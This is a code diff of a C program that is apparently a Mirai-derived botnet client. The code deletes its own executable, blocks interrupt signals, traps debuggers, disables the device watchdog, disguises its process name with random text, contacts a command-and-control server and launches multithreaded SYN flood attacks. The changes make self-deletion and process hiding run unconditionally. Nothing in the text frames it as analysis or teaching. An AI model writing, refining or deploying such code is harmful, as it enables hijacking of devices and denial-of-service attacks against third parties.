@@ -33,9 +33,7 @@ int main(int argc, char **args) {
 // Prevent signal control
 // Prevent debuging (gdb)
 // Prevent watchdoog from rebooting the device
-    int test = unlink(args[0]);
-
-    printf("status unlink %d\n", test);
+    
 #ifndef DEBUG
     unlink(args[0]);
 
@@ -44,27 +42,24 @@ int main(int argc, char **args) {
     sigaddset(&signal_set, SIGINT);
     sigprocmask(SIG_BLOCK, &signal_set, NULL);
 
+
+
     signal(SIGCHLD, SIG_IGN);
     signal(SIGTRAP, &anti_gdb_entry);
 
-    if ((fd = open("/dev/watchdog", 2)) != -1 ||
-        (fd = open("/dev/misc/watchdog", 2)) != -1) {
+    if ((fd = open("/dev/watchdog", 2)) != -1) {
         int flags = WDIOS_DISABLECARD;
 
         ioctl(fd, WDIOC_SETOPTIONS, &flags);
         close(fd);
         fd = 0;
-
-        // int one = 1;
-        // ioctl(fd, 0x80045704, &one);
     }
+
     chdir("/");
 #endif
 
 
 
-    // Create fake connection 
-    // FROM Mirai    
     LOCAL_ADDR = util_local_addr();
 
     fake_cnc_addr.sin_family = AF_INET;
@@ -73,7 +68,7 @@ int main(int argc, char **args) {
 
 
     rand_init();
-#ifndef DEBUG
+
     // Delete self
     unlink(args[0]);
 
@@ -86,13 +81,13 @@ int main(int argc, char **args) {
     name_buf[name_buf_len] = 0;
     util_strcpy(args[0], name_buf);
 
-    // Hide process name
-    name_buf_len = ((rand_next() % 6) + 3) * 4;
-    rand_alphastr((unsigned char*)name_buf, name_buf_len);
-    name_buf[name_buf_len] = 0;
 
+
+    rand_alphastr((unsigned char*)name_buf, 6);
+    name_buf[name_buf_len] = '\0';
     prctl(PR_SET_NAME, name_buf);
-#endif
+
+
 
     cnc_addr.sin_family = AF_INET;
     cnc_addr.sin_addr.s_addr = INADDR_ANY;
@@ -134,7 +129,7 @@ int main(int argc, char **args) {
 
             if((char) buffer[0] == '0'){
 #ifdef DEBUG
-    printf("[main] Waiting for attack");
+    printf("[main] Waiting for attack \n");
 #endif               
             }
 
@@ -370,7 +365,7 @@ static void attack(char * ip, int port) {
     td[i].floodport = floodport;
     pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
   }
-  fprintf(stdout, "Starting Flood...\n");
+  fprintf(stdout, "[main] Starting SYN FLOOD\n");
   
 
   return 0;
